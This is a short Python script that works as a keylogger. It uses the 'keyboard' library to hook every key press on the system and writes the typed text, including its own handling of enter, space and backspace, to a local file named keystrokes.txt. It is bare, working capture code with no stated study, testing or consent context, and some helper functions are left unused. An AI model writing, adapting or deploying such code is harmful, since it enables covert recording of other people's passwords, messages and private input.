import sys
import keyboard
import asyncio
import time

log_file = 'keystrokes.txt'




def on_key_press(event):
    with open(log_file, 'a') as f:
        if event.name == 'enter':
            f.write('\n')
        elif event.name == 'space':
            f.write(' ')
        elif event.name == 'backspace':
            size = f.tell()
            f.truncate(size - 1)
        elif event.name == '?' or event.name == '.' or event.name == '!':
            f.write(event.name + '\n')
        elif event.name == 'alttab' or event.name == 'tab':
            pass
        elif event.name == 'shift' or event.name == 'right shift':
            pass
        else:
            f.write(event.name)


def closeProgram():
    sys.exit(0)

async def clear(time, text):
    await asyncio.sleep(time)
    open(log_file, 'w').close()


keyboard.on_press(on_key_press)
keyboard.wait()




